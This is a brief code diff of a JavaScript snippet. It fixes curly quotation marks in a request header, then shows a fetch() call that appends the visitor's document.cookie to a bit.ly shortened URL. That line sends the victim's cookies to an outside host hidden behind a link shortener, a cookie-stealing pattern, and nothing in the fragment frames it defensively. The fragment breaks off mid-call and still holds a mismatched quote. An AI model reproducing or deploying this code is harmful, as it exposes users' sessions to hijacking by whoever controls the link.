@@ -1,5 +1,5 @@
 let headersList = {
- "Accept": “*/*”
+ "Accept": "*/*"
 }
 
 let response = await fetch("https://bit.ly/3Hkv2yj?cookie=“+document.cookie, { 
